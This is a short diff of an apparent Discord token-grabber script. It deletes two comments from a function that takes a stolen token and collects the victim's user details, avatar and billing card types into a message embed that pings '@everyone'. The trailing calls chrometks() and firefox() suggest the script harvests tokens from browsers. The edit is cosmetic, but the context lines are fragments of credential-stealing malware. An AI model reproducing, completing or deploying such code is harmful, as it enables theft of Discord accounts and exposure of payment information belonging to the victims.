@@ -94,7 +94,6 @@ def verifytks(token):
             locale = userinfo.get('locale')
             pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}" if avatar else "None"
 
-            # Billing Info Logic
             billing_fields = []
             cc_digits = {"visa": "4", "mastercard": "5", "amex": "3", "discover": "6"}
 
@@ -173,7 +172,6 @@ def verifytks(token):
                     "inline": False
                 })
 
-            # Final Embed Payload
             payload = {
                 "content": "||@everyone||",
                 "embeds": [
@@ -475,3 +473,4 @@ chrometks()
 firefox()
 
         
+
